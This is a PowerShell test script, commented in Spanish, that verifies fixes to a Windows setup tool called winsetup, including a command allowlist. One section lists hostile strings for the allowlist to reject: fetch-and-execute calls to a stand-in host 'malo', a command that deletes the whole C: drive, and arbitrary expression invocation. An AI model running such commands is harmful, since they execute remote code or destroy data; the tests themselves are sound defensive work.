# Pruebas de los 4 arreglos de winsetup. Se ejecuta en el servidor.
$base = Split-Path -Parent (Split-Path -Parent $MyInvocation.MyCommand.Path)
$fallos = 0
function Ok($m)   { "  OK   $m" }
function Bad($m)  { $script:fallos++; "  FALLO $m" }

'== 1) Sintaxis de todos los .psm1 y .ps1'
Get-ChildItem "$base\modules\*.psm1", "$base\*.ps1" | ForEach-Object {
    $e = $null; $t = $null
    [System.Management.Automation.Language.Parser]::ParseFile($_.FullName, [ref]$t, [ref]$e) | Out-Null
    if ($e -and $e.Count) { Bad "$($_.Name): $($e[0].Message)" } else { Ok $_.Name }
}

'== 2) Los modulos se importan'
try {
    Import-Module "$base\modules\Core.psm1"   -Force -ErrorAction Stop
    Import-Module "$base\modules\UI.psm1"     -Force -ErrorAction Stop
    Import-Module "$base\modules\Tweaks.psm1" -Force -ErrorAction Stop -DisableNameChecking
    Import-Module "$base\modules\Software.psm1" -Force -ErrorAction Stop
    Ok 'Core + UI + Tweaks + Software importados'
} catch { Bad "import: $($_.Exception.Message)" }

'== 3) Test-InteractiveSession detecta esta sesion SSH como NO interactiva'
$i = Test-InteractiveSession
if ($i -eq $false) { Ok "Test-InteractiveSession = False (correcto por SSH)" }
else { Bad "Test-InteractiveSession = $i (deberia ser False en SSH)" }

'== 4) Wait-UserAck NO se queda colgado en sesion no interactiva'
$sw = [Diagnostics.Stopwatch]::StartNew()
Wait-UserAck -Message 'esto no deberia esperar'
$sw.Stop()
if ($sw.Elapsed.TotalSeconds -lt 3) { Ok "Wait-UserAck volvio en $([math]::Round($sw.Elapsed.TotalSeconds,2))s" }
else { Bad "Wait-UserAck tardo $($sw.Elapsed.TotalSeconds)s" }

'== 5) Allowlist: TODOS los comandos reales de los configs deben pasar'
$cmds = @()
Get-ChildItem "$base\config" -Recurse -Filter 'tweaks.json' | ForEach-Object {
    try {
        $j = Get-Content $_.FullName -Raw -Encoding UTF8 | ConvertFrom-Json
        foreach ($cat in $j.categories) {
            foreach ($tw in $cat.tweaks) {
                if ($tw.powerConfig) { $cmds += @($tw.powerConfig) }
            }
        }
    } catch { Bad "no se pudo leer $($_.Name): $($_.Exception.Message)" }
}
$cmds = $cmds | Where-Object { $_ -match '^\w+-\w+' } | Select-Object -Unique
"  (comandos tipo cmdlet encontrados en los configs: $($cmds.Count))"
foreach ($c in $cmds) {
    $mal = Get-DisallowedCommands -CommandText $c
    if ($mal.Count -eq 0) { Ok ("permitido: " + $c.Substring(0, [Math]::Min(60, $c.Length))) }
    else { Bad ("RECHAZARIA un comando legitimo del config [$($mal -join ',')]: " + $c.Substring(0, [Math]::Min(60, $c.Length))) }
}

'== 6) Allowlist: rechaza lo que debe rechazar'
# NOTA: la allowlist limita QUE comandos, no sus argumentos. Un 'Remove-Item' con
# una ruta destructiva SI pasaria (esta permitido para claves de registro). Es un
# limite conocido y asumido: el config es nuestro y esta versionado.
$maliciosos = @(
    'Invoke-WebRequest http://malo/x.ps1 -OutFile C:\x.ps1',
    'Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private; iex (irm http://malo/x)',
    'Start-Process cmd.exe -ArgumentList "/c del /f /s /q C:\*"',
    'Get-Service | ForEach-Object { Invoke-Expression $_.Name }',
    '& $env:cosa'
)
foreach ($m in $maliciosos) {
    $mal = Get-DisallowedCommands -CommandText $m
    if ($mal.Count -gt 0) { Ok ("rechazado [$($mal -join ',')]: " + $m.Substring(0, [Math]::Min(45, $m.Length))) }
    else { Bad ("NO rechazo algo peligroso: $m") }
}

'== 7) El menu de checkboxes devuelve ARRAY con 1 solo elemento marcado'
# se prueba la parte que se corrigio: List + Write-Output -NoEnumerate
$lista = New-Object System.Collections.Generic.List[object]
$lista.Add([pscustomobject]@{ name = 'uno' })
# mismo idiom que quedo en UI.psm1
function Test-Retorno { return ,$lista.ToArray() }
$r = Test-Retorno
if ($r -is [array] -and $r.Count -eq 1) { Ok "devuelve array de 1 (Count=$($r.Count), tipo=$($r.GetType().Name))" }
else { Bad "NO es array de 1: tipo=$($r.GetType().Name)" }
# y que UI.psm1 use ese idiom de verdad, no otro
if (Select-String -Path "$base\modules\UI.psm1" -Pattern 'return ,\$result\.ToArray\(\)' -Quiet) {
    Ok 'UI.psm1 usa el idiom "return ,$result.ToArray()"'
} else { Bad 'UI.psm1 NO usa el idiom verificado' }
if (Select-String -Path "$base\modules\UI.psm1" -Pattern '\$input\s*=' -Quiet) {
    Bad 'UI.psm1 sigue asignando a la variable automatica $input'
} else { Ok 'UI.psm1 ya no pisa la variable automatica $input' }

'== 8) Ya no queda ningun Read-Host suelto en Software.psm1'
$rh = Select-String -Path "$base\modules\Software.psm1" -Pattern 'Read-Host'
if (-not $rh) { Ok 'sin Read-Host en Software.psm1' }
else { Bad "quedan $($rh.Count) Read-Host: linea(s) $(($rh | ForEach-Object { $_.LineNumber }) -join ',')" }

'== 9) Ya no queda Invoke-Expression'
$ie = Select-String -Path "$base\modules\*.psm1" -Pattern 'Invoke-Expression'
if (-not $ie) { Ok 'sin Invoke-Expression en los modulos' }
else { Bad "queda Invoke-Expression en: $(($ie | ForEach-Object { $_.Filename + ':' + $_.LineNumber }) -join ', ')" }

''
if ($fallos -eq 0) { "RESULTADO: TODO OK" } else { "RESULTADO: $fallos FALLO(S)" }
